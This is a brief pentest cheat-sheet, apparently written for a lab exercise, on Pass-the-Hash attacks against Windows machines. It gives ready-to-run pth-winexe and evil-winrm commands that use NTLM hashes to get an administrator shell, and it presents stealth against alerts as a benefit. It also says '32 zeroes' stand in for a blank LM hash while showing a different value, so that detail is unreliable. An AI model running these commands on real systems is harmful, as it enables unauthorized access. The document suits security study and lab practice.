
---

### 🔐 **Why use Pass-the-Hash (PtH)?**

- **Faster**: No waiting for hash cracking.
    
- **Reliable**: Works even if the password is complex or not in your wordlist.
    
- **Stealthier**: Avoids brute-force attempts that could trigger alerts.
    

---

### 🧪 **How to Use PtH with `pth-winexe`**

```bash
pth-winexe -U 'admin%LM_HASH:NTLM_HASH' //MACHINE_IP cmd.exe

or 
sudo gem install ffi
evil-winrm -i 10.10.144.131 -u admin -H a9fdfa038c4b75ebc76dc855dd74f0da

```

- Replace `LM_HASH:NTLM_HASH` with the **actual full hash** from your dump.
    
- If the LM hash is disabled or blank (common), just use 32 zeroes:
    
    ```
    aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
    ```
    

✅ **Example**:

```bash
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:8b1a9953c4611296a827abf8c47804d7' //10.10.10.10 cmd.exe
```

This gives you a **command shell as the admin user**, even though you don’t know the actual password.

---
